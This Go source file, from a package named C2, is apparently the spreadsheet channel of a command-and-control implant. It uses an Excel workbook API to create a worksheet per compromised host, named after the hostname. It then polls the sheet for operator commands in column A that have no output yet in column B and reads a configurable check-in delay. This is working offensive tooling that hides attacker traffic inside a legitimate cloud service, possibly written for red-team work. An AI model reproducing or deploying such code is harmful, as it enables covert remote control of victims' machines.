package C2

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"strconv"
	"time"
)

type WorkSheet struct {
	Id         string `json:"id"`
	Position   int    `json:"position"`
	Name       string `json:"name"`
	Visibility string `json:"visibility"`
}

type WorkSheets struct {
	Value []WorkSheet `json:"value"`
}

type CellRange struct {
	Address       string  `json:"address"`
	AddressLocal  string  `json:"addressLocal-value"`
	CellCount     int     `json:"cellCount"`
	ColumnCount   int     `json:"columnCount"`
	ColumnHidden  bool    `json:"columnHidden"`
	ColumnIndex   int     `json:"columnIndex"`
	Formulas      []any   `json:"formulas"`
	FormulasLocal []any   `json:"formulasLocal"`
	FormulasR1C1  []any   `json:"formulasR1C1"`
	Hidden        bool    `json:"hidden"`
	NumberFormat  []any   `json:"numberFormat"`
	RowCount      int     `json:"rowCount"`
	RowHidden     bool    `json:"rowHidden"`
	RowIndex      int     `json:"rowIndex"`
	Text          []any   `json:"text"`
	ValueTypes    []any   `json:"valueTypes"`
	Values        [][]any `json:"values"`
}

type Ok struct {
	Ok bool `json:"ok"`
}

func (c *Client) GenerateNewSheetName() string {

	currentTime := time.Now()
	currentTimeS := currentTime.Format("02-01-2006")
	unixString := strconv.FormatInt(currentTime.Unix(), 10)
	hostname, err := os.Hostname()
	if err != nil {
		return currentTimeS + "_" + unixString[len(unixString)-5:]
	}
	return currentTimeS + "_" + hostname
}

func (c *Client) AddSheet(name string) {

	// Check if the worksheet exists
	if !c.DoesWorksheetExist(name) {

		// Create the worksheet
		body := new(WorkSheet)
		body.Name = name
		json_body, _ := json.Marshal(body)
		req, err := c.newRequest("POST", "/add", bytes.NewBuffer(json_body))
		if err != nil {
			log.Fatal(err)
		}

		ws := new(WorkSheet)
		_, err = c.do(req, &ws)
		if err != nil {
			log.Fatal("Failed to create worksheet: ", err)
		}

		// Add the ticker
		trange := "A1:" + c.TickerCell
		ticker_data := [][]string{{"Command", "Output", "Delay config (sec):", strconv.Itoa(c.Ticker)}}
		_, err = c.UpdateRange(trange, ticker_data)
		if err != nil {
			c.LogFatalDebugError("Cell change error ", err)
		}
	}

}

func (c *Client) UpdateRange(cells string, values_string [][]string) (*CellRange, error) {

	body := map[string][][]string{
		"values": values_string,
	}
	json_body, _ := json.Marshal(body)
	req, err := c.newRequest("PATCH", `/`+c.SheetName+`/range(address='`+cells+`')`, bytes.NewBuffer(json_body))
	if err != nil {
		log.Fatal(err)
	}

	cr := new(CellRange)
	_, err = c.do(req, &cr)
	if err != nil {
		return nil, err
	}
	return cr, err
}

func (c *Client) GetRangeValues(cells string) (*CellRange, error) {

	req, err := c.newRequest("GET", `/`+c.SheetName+`/range(address='`+cells+`')`, nil)
	if err != nil {
		log.Fatal(err)
	}

	cr := new(CellRange)
	_, err = c.do(req, &cr)
	if err != nil {
		return nil, err
	}
	return cr, err
}
func (c *Client) GetWorksheets() (*WorkSheets, error) {
	req, err := c.newRequest("GET", "/", nil)
	if err != nil {
		log.Fatal(err)
	}

	wsa := new(WorkSheets)
	_, err = c.do(req, &wsa)
	if err != nil {
		return nil, err
	}
	return wsa, err
}

func (c *Client) DoesWorksheetExist(ws_name string) bool {
	wsas, err := c.GetWorksheets()
	if err != nil {
		log.Fatal(err)
	}
	exists := false

	for _, v := range wsas.Value {
		if v.Name == ws_name {
			exists = true
		}
	}

	return exists
}

func (c *Client) GetCommandsFromSheet(ws_name string) (int, []Command, error) {
	var tick = 0
	req, err := c.newRequest("GET", `/`+c.SheetName+`/usedRange`, nil)
	if err != nil {
		log.Fatal(err)
	}

	cr := new(CellRange)
	cmds := []Command{}

	_, err = c.do(req, &cr)
	if err != nil {
		return tick, nil, err
	}

	if len(cr.Values) > 0 {
		// Pulls the ticker value
		tr, tc, _ := c.ConvertExcelCoordinates(c.TickerCell)
		tick = int(cr.Values[tr][tc].(float64))

		cmds = c.convertCellsToCommands(*cr, cmds)
	}

	return tick, cmds, err
}

func (c *Client) convertCellsToCommands(cells CellRange, cmds []Command) []Command {

	for i, value := range cells.Values {
		// skip header row
		if i != 0 {

			// If the output is set, we don't care
			if value[1].(string) == "" {
				c.LogDebug("Found command - " + fmt.Sprintf("value: %v", value))
				cmd := new(Command)
				cmd.InputCol = "A"
				cmd.OutputCol = "B"
				cmd.Row = i
				cmd.Input = value[0].(string)

				cmds = append(cmds, *cmd)
			}
		}
	}
	return cmds
}

func (c *Client) ConvertExcelCoordinates(cell string) (int, int, error) {
	// Split the cell reference into letters (column) and numbers (row).
	// The column is in base 26, with A=1, B=2, ..., Z=26.
	// The row is in base 10.

	// Split the cell reference into letters and digits.
	var letters, digits string
	for _, r := range cell {
		if r >= 'A' && r <= 'Z' {
			letters += string(r)
		} else if r >= '0' && r <= '9' {
			digits += string(r)
		} else {
			return 0, 0, fmt.Errorf("invalid character in cell reference: %v", r)
		}
	}

	// Convert the column letters to a number.
	column := 0
	for _, r := range letters {
		column = column*26 + int(r-'A') + 1
	}

	// Convert the row digits to a number.
	row, err := strconv.Atoi(digits)
	if err != nil {
		return 0, 0, fmt.Errorf("invalid row number: %v", err)
	}

	// Return the row and column as zero-based indices.
	return row - 1, column - 1, nil
}
